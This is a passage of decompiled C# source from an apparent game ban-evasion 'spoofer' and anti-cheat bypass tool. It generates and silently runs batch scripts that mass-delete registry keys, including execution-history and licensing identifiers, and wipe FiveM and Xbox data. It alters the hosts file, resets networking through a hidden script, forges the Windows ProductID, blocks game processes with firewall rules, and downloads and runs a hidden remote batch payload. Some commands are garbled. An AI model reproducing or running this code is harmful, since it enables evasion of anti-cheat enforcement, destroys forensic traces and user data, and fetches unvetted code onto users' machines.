						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
						streamWriter.WriteLine(":folderclean");
						streamWriter.WriteLine("call :getDiscordVersion");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("goto :xboxclean");
						streamWriter.WriteLine(": getDiscordVersion");
						streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
						streamWriter.WriteLine("     set 'varLoc =%%a'");
						streamWriter.WriteLine("   goto :d1");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine(":d1");
						streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
						streamWriter.WriteLine("     set 'discordVersion =%%z'");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine("goto :EOF");
						streamWriter.WriteLine(": xboxclean");
						streamWriter.WriteLine(" cls");
						streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
						streamWriter.WriteLine("sc stop XblAuthManager");
						streamWriter.WriteLine("sc stop XblGameSave");
						streamWriter.WriteLine("sc stop XboxNetApiSvc");
						streamWriter.WriteLine("sc stop XboxGipSvc");
						streamWriter.WriteLine("sc delete XblAuthManager");
						streamWriter.WriteLine("sc delete XblGameSave");
						streamWriter.WriteLine("sc delete XboxNetApiSvc");
						streamWriter.WriteLine("sc delete XboxGipSvc");
						streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
						streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
						streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
						streamWriter.WriteLine("exit");
						streamWriter.WriteLine("goto :eof");
					}
					Process process = Process.Start(text);
					process.WaitForExit();
					File.Delete(text);
					string path = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path))
					{
						Directory.CreateDirectory(path);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text2 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter2 = File.CreateText(text2))
						{
							streamWriter2.WriteLine("netsh int ip reset");
						}
						Process process2 = new Process();
						process2.StartInfo.FileName = text2;
						this.d.Add(process2);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process2.Start();
					}
					string text3 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter3 = new StreamWriter(text3))
					{
						streamWriter3.WriteLine("echo off");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("taskkill /f /im Steam.exe /t");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
						streamWriter3.WriteLine("cls");
					}
					Process process3 = Process.Start(text3);
					process3.WaitForExit();
					File.Delete(text3);
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.FiveM();
					Main.bi();
					string path2 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path2))
					{
						Directory.CreateDirectory(path2);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text4 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter4 = File.CreateText(text4))
						{
							streamWriter4.WriteLine("netsh int ip reset");
						}
						Process process4 = new Process();
						process4.StartInfo.FileName = text4;
						this.d.Add(process4);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process4.Start();
						Thread.Sleep(500);
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
					{
						Directory.Delete(folderPath + "\\DigitalEntitlements", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\citizen"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\citizen", true);
					}
					Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
					if (Directory.Exists(folderPath2 + "\\CitizenFX"))
					{
						Directory.Delete(folderPath2 + "\\CitizenFX", true);
					}
					string path3 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path3))
					{
						Directory.CreateDirectory(path3);
					}
					if (File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					else
					{
						string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
						string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
						WebClient webClient = new WebClient();
						webClient.DownloadFile(address, fileName);
						File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					MessageBox.Show("FiveM Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.ao.Text == "FiveM Bypass")
				{
					base.Hide();
					Process[] processesByName = Process.GetProcessesByName("FiveM");
					if (processesByName.Length != 0)
					{
						foreach (Process process5 in Process.GetProcessesByName("FiveM"))
						{
							process5.Kill();
						}
					}
					if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
					{
						Directory.Delete("C:\\Program Files (x86)\\Blade Group");
						Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
					}
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					new Process
					{
						StartInfo = new ProcessStartInfo
						{
							WindowStyle = ProcessWindowStyle.Hidden,
							FileName = "cmd.exe",
							Arguments = "/C Start Explorer.exe fivem://connect/" + this.br.Text
						}
					}.Start();
					new Process
					{
						StartInfo = 
						{
							FileName = "cmd.exe",
							CreateNoWindow = true,
							RedirectStandardInput = true,
							RedirectStandardOutput = true,
							UseShellExecute = false,
							Verb = "runas",
							Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
						}
					}.Start();
					base.Hide();
					System.Timers.Timer timer = new System.Timers.Timer(50.0);
					timer.AutoReset = true;
					timer.Elapsed += Main.MyMethod2;
					timer.Start();
				}
				else if (this.ao.Text == "Rust")
				{
					string tempPath = Path.GetTempPath();
					byte[] bytes = Login.KeyAuthApp.download("203677");
					File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
					File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					d d2 = new d();
					d2.b();
					Main.HWIDclick();
					string value = string.Concat(new string[]
					{
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5)
					});
					RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
					registryKey.SetValue("ProductID", value);
					registryKey.Close();
					Main.InstallDate();
					Main.Disk();
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.bi();
					Main.SpoofPCName();
					string path4 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path4))
					{
						Directory.CreateDirectory(path4);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text5 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter5 = File.CreateText(text5))
						{
							streamWriter5.WriteLine("netsh int ip reset");
						}
						Process process6 = new Process();
						process6.StartInfo.FileName = text5;
						this.d.Add(process6);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process6.Start();
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
					}
					string text6 = this.bh.Text;
					string path5 = "C:\\Program Files\\Unlisted";
					if (!Directory.Exists(path5))
					{
						Directory.CreateDirectory(path5);
					}
